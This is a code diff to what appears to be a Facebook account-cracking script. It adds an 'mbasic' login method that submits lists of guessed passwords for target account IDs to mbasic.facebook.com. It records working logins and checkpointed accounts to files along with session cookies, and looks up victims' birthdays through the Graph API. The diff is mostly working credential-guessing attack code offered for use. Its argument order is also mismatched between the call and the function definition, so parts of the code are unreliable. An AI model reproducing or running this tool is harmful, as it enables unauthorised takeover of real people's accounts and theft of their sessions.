@@ -678,7 +678,7 @@ def setting():
     else:
         print(' [+] Pilih Yang Bener Sayang ')
         exit()
-    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]\n[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]Api.facebook.com[bold white] [/]',subtitle="╭───", subtitle_align="left", title="[bold green] Method"))
+    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]\n[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]Api.facebook.com[bold white] [/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site [bold green]Mbasic.facebook.com[bold white] [/]',subtitle="╭───", subtitle_align="left", title="[bold green] Method"))
     hc = Console().input(f"[bold cyan]   ╰─> ")
     if hc in ['1','01']:
         method.append('validate1')
@@ -688,6 +688,8 @@ def setting():
         method.append('reguler1')
     elif hc in ['4','04']:
         method.append('api1')
+    elif hc in ['5','05']:
+        method.append('mbasic')
     else:
         method.append('api1')
     #Console(width=80, style="bold cyan").print(Panel('''[bold yellow]Ingin memasukkan Password Manual ?[bold green] Y/T	[[bold red]Not Recommended[bold white]]''',subtitle="╭───", subtitle_align="left", title="[bold green]Password Manual"))
@@ -787,6 +789,8 @@ def passwrd():
 					pool.submit(reguler1,idf,pwv)
 				elif 'api1' in method:
 					pool.submit(api1,idf,pwv)
+				elif 'mbasic' in method:
+					pool.submit(mbasic,idf,pwv)
 				else:
 					pool.submit(api1,idf,pwv)
 		print('')
@@ -1016,7 +1020,45 @@ def api1(idf,pwv):
         except requests.exceptions.ConnectionError:
             time.sleep(31)
     loop+=1
+    
+    
+def mbasic(pwv,idf):
+        try:
+            for i in idf.get("pw"):
+                log = logger(idf.get("id"),i,"https://mbasic.facebook.com")
+                if log.get("status")=="cp":
+                    try:ke = requests.get("https://graph.facebook.com/" + idf.get("id") + "?access_token=" + open("token.txt","r").read());tt = json.loads(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = dic2[m];print("\r[CP] %s • %s • %s %s %s   "%(idf.get("id"),i,d,m,y));pwv.cp.append("%s•%s•%s%s%s"%(idf.get("id"),i,d,m,y));open("cp.txt","a+").write("%s•%s•%s%s%s\n"%(idf.get("id"),i,d,m,y));break
+                    except(KeyError, IOError):m = " ";d = " ";y = " "
+                    except:pass
+                    print("\r[CP] %s • %s               "%(idf.get("id"),i));pwv.cp.append("%s•%s"%(idf.get("id"),i));open("cp.txt","a+").write("%s•%s\n"%(idf.get("id"),i));break
+                elif log.get("status")=="success":print("\r[OK] %s • %s • %s              "%(idf.get("id"),i,koki(log.get("cookies"))));pwv.ada.append("%s•%s"%(idf.get("id"),i));open("ok.txt","a+").write("%s•%s\n"%(idf.get("id"),i));break
+                else:continue
+            pwv.ko+=1
+            print("\r[Crack][%s/%s][OK:%s][CP:%s]"%(pwv.ko,len(pwv.fl),len(pwv.ada),len(pwv.cp)), end=' ');sys.stdout.flush()
+        except:
+            pwv.mbasic(idf)
+            
+            
+def logger(em,pas,hosts):
+    ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]';r = requests.Session();r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});p = r.get("https://mbasic.facebook.com/");b = bs4.BeautifulSoup(p.text,"html.parser");meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text));data={}
+    for i in b("input"):
+        if i.get("value") is None:
+            if i.get("name")=="email":data.update({"email":em})
+            elif i.get("name")=="pass":data.update({"pass":pas})
+            else:data.update({i.get("name"):""})
+        else:data.update({i.get("name"):i.get("value")})
+    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""});r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"});po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    else:return {"status":"error","email":em,"pass":pas}
 	    
+     
+def koki(cookies):
+    result=[]
+    for i in enumerate(cookies.keys()):
+        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
+        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
+    return "".join(result)
 #-----------------------[ CEK APLIKASI ]--------------------#
 def cek_apk(kuki):
 	session = requests.Session()
